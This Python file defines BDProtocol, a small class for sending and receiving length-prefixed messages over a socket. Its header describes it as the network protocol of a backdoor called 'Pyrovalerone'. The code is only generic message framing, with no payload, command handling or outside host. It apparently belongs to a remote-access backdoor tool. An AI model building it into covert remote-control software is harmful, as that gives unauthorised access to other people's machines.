"""
    Pyrovalerone
    Backdoor Network Protocol implementation
"""
import socket
import struct

""""
    @class BDProtocol
    @brief Used for sending / receiving backdoor messages
"""
class BDProtocol:

    def __init__(self, s=None, verbose=False):
        self.verbose = verbose
        self.conn = s
        assert self.conn != None

    def send_msg(self, msg):

        # Convert strings to bytes
        if isinstance(msg, str): 
            msg = msg.encode()
        
        if not isinstance(msg, bytes):
            raise RuntimeError("Message to send must be either bytes or string.")

        # Create packet structure encoding length and message
        msg = struct.pack('>I', len(msg)) + msg # len + msg

        # Send the message to the socket
        self.conn.sendall(msg)

    def recv_msg(self):

        # Receive message length from the socket
        msgLen = self.recvall(4)
        if not msgLen:
            return None

        # Decode the message length into a python integer
        msgLen = struct.unpack('>I', msgLen)[0]

        if self.verbose:
            print("INCOMING PACKET: %d bytes" % msgLen)

        # Receive and decode the message
        return self.recvall(msgLen).decode('ascii')

    def recvall(self, n:int=0) -> bytes:

        # Create new data array
        data = bytearray()

        # Receive given number of bytes
        while len(data) < n:

            # Get the packet
            packet = self.conn.recv(n - len(data))
            if not packet:
                return None

            # Add packet contents to bytearray
            data.extend(packet)

        # Return the final packet
        return data